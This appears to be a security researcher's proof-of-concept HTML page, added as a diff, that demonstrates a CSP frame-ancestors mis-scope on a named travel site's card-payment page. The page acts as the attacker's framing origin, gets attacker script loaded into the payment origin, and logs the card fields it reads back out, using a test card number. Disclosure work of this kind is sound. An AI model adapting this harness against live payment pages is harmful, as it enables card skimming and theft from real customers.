@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC — Agoda PCI Payment Page: CSP frame-ancestors mis-scope</title>
+<style>
+  :root{
+    --red:#c0392b; --green:#1a8a4a; --bg:#0f1115; --panel:#171a21; --line:#2a2f3a;
+    --text:#e8eaed; --muted:#9aa1ac; --accent:#5aa9ff;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg);color:var(--text);}
+  header{padding:20px 24px;border-bottom:1px solid var(--line);}
+  header h1{margin:0 0 6px;font-size:18px;}
+  header p{margin:0;color:var(--muted);font-size:13px;line-height:1.5;}
+  header code{background:#000;padding:1px 6px;border-radius:4px;color:#ffd166;}
+  .wrap{display:flex;gap:16px;padding:16px;flex-wrap:wrap;}
+  .col{flex:1 1 420px;min-width:320px;}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:16px;}
+  .panel h2{margin:0 0 10px;font-size:14px;color:var(--accent);text-transform:uppercase;letter-spacing:.04em;}
+  #status{font-weight:700;font-size:15px;padding:12px 14px;border-radius:8px;border:1px solid var(--line);}
+  #status.pending{color:#ffd166;background:#2a2408;}
+  #status.pass{color:#fff;background:var(--green);border-color:var(--green);}
+  #log{font-family:ui-monospace,Consolas,Menlo,monospace;font-size:12px;line-height:1.6;
+       background:#000;border-radius:8px;padding:12px;max-height:260px;overflow-y:auto;color:#c8f7c5;}
+  #log .err{color:#ff8686}
+  #log .exfil{color:#ffd166;font-weight:700}
+  .meta{color:var(--muted);}
+  iframe{width:100%;height:420px;border:2px solid var(--red);border-radius:8px;background:#fff;}
+  .iframe-label{font-size:12px;color:var(--muted);margin-bottom:6px;}
+  button{background:var(--accent);color:#00121f;border:none;padding:8px 14px;border-radius:6px;
+        font-weight:700;cursor:pointer;font-size:13px;}
+  button:hover{filter:brightness(1.1)}
+  .capture{background:#1c1400;border:1px solid #6b5200;border-radius:8px;padding:12px;margin-top:10px;
+            font-family:ui-monospace,Consolas,monospace;font-size:12px;color:#ffe08a;display:none;}
+  footer{padding:16px 24px;color:var(--muted);font-size:11px;border-top:1px solid var(--line);}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>PoC &mdash; Agoda PCI payment page executes attacker-supplied JavaScript inside the card-entry origin</h1>
+  <p>
+    <code>gwpci.agoda.com/app/payment/index-v4.html</code>'s Content-Security-Policy
+    <code>frame-ancestors</code> allow-list includes <code>*.wl44.solution.net</code> and
+    <code>*.wl54.solution.net</code> &mdash; a domain Agoda does not control (see the submitted report
+    for the RDAP/DNS/certificate-transparency evidence). This page plays the role of that
+    untrusted framing origin. The right-hand iframe below is running <strong>Agoda's own,
+    completely unmodified</strong> client-side code, saved verbatim from a live request to the
+    real page. Nothing on Agoda's infrastructure is contacted at any point in this demo.
+  </p>
+</header>
+
+<div class="wrap">
+  <div class="col">
+    <div class="panel">
+      <h2>Live status</h2>
+      <div id="status" class="pending">Waiting for the framed page to load&hellip;</div>
+      <div id="capture" class="capture"></div>
+    </div>
+    <div class="panel">
+      <h2>What you're watching</h2>
+      <ol style="font-size:13px;color:var(--muted);line-height:1.7;padding-left:18px;">
+        <li>The iframe on the right loads Agoda's real, unmodified page logic.</li>
+        <li>That code asks <code>document.location.ancestorOrigins[0]</code> &mdash; i.e. <em>this
+            page</em> &mdash; who is framing it, then fetches
+            <code>&lt;that origin&gt;/getClientSideAssets?page=ccform</code> from it.</li>
+        <li>This page (the "attacker") answers with a manifest pointing at
+            <code>payload.js</code>, also hosted on this same origin.</li>
+        <li>Agoda's own code injects that script into its own document with a plain
+            <code>&lt;script&gt;</code> tag &mdash; full DOM access, PCI origin.</li>
+        <li>The injected script renders a card form and reads it back out, proving real
+            data capture, not just script execution.</li>
+      </ol>
+    </div>
+    <div class="panel">
+      <h2>Event log (from the real, unmodified Agoda code)</h2>
+      <div id="log">waiting for events&hellip;</div>
+      <button id="reset" style="margin-top:10px;">Run again</button>
+    </div>
+  </div>
+
+  <div class="col">
+    <div class="iframe-label">&darr; iframe running Agoda's real, unmodified <code>index-v4.html</code> logic</div>
+    <iframe id="victim" src="__VICTIM_URL__"></iframe>
+  </div>
+</div>
+
+<footer>
+  This proof-of-concept is fully self-contained: both frames here are hosted by the reporting
+  researcher. The only "victim" content is Agoda's own publicly-served, byte-for-byte unmodified
+  client-side JavaScript. No Agoda system, production or otherwise, is contacted, framed, or
+  interacted with at any point. The pre-filled "card" values are the standard Visa test PAN
+  (4111 1111 1111 1111) &mdash; not real payment data.
+</footer>
+
+<script>
+  var VICTIM_URL = "__VICTIM_URL__";
+  var logEl = document.getElementById('log');
+  var statusEl = document.getElementById('status');
+  var captureEl = document.getElementById('capture');
+  var iframeEl = document.getElementById('victim');
+  var lines = [];
+
+  function ts() {
+    var d = new Date();
+    return d.toTimeString().split(' ')[0] + '.' + String(d.getMilliseconds()).padStart(3, '0');
+  }
+
+  function log(text, cls) {
+    lines.push('<div' + (cls ? ' class="' + cls + '"' : '') + '>[' + ts() + '] ' + text + '</div>');
+    logEl.innerHTML = lines.join('');
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  window.addEventListener('message', function (event) {
+    var data = event.data;
+    if (!data || !data.type) return;
+
+    if (data.type === 'POC_EXFIL') {
+      log('<span class="exfil">EXFIL</span> received from victim-origin script, origin=' +
+          event.origin + ' &mdash; card data read out of the injected form:', 'exfil');
+      log('&nbsp;&nbsp;cardNumber=' + data.payload.cardNumber +
+          ' expiry=' + data.payload.expiry + ' cvv=' + data.payload.cvv, 'exfil');
+      statusEl.className = 'pass';
+      statusEl.innerHTML = '&#9989; CONFIRMED: attacker-controlled script executed inside the ' +
+        'PCI origin (' + data.payload.capturedFromOrigin + ') and read the card form contents.';
+      captureEl.style.display = 'block';
+      captureEl.textContent = JSON.stringify(data.payload, null, 2);
+      return;
+    }
+
+    // Agoda's own dispatchLogEvent() calls: {type, payload}
+    var isErr = /ERROR|FAILED|TIMEOUT/.test(data.type);
+    log('victim-origin event <b>' + data.type + '</b>' +
+        (data.payload && Object.keys(data.payload).length
+          ? ' <span class="meta">' + JSON.stringify(data.payload) + '</span>' : '') +
+        ' <span class="meta">(from ' + event.origin + ')</span>',
+        isErr ? 'err' : null);
+  });
+
+  document.getElementById('reset').addEventListener('click', function () {
+    lines = [];
+    logEl.innerHTML = 'waiting for events&hellip;';
+    statusEl.className = 'pending';
+    statusEl.textContent = 'Waiting for the framed page to load…';
+    captureEl.style.display = 'none';
+    iframeEl.src = 'about:blank';
+    setTimeout(function () { iframeEl.src = VICTIM_URL; }, 50);
+  });
+</script>
+
+</body>
+</html>
